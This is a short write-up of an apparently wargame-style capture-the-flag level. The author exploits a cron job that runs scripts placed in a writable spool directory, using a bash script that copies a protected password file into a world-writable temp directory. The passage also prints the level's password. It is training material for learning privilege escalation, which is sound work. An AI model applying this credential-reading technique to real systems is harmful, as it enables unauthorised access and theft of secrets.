This one I will readily admit I got stuck on and it's tricky, not to mention
very difficult to debug as there are no error messages. What finally worked
was `cd $(mktemp -d)` and writing a script `exploit.sh`, which contained the
following:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.oslPOre1BU/password
```

This obviously needs to be tailored to the `mktemp` directory in question. I
then did `touch password` and did `chmod 666 password` to make `password`
writable. I also did `chmod 777 /tmp/tmp.oslPOre1BU` to make the *directory*
writable, which the walkthrough I used omitted. They both have to be there!

Then I did `chmod 777 exploit.sh` and copied it to `/var/spool/bandit24`
which, surprisingly, was writable but not readable, which is how this solution
works at all. Then I waited for a minute. Finally the password,
`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ` was dumped to `password`.
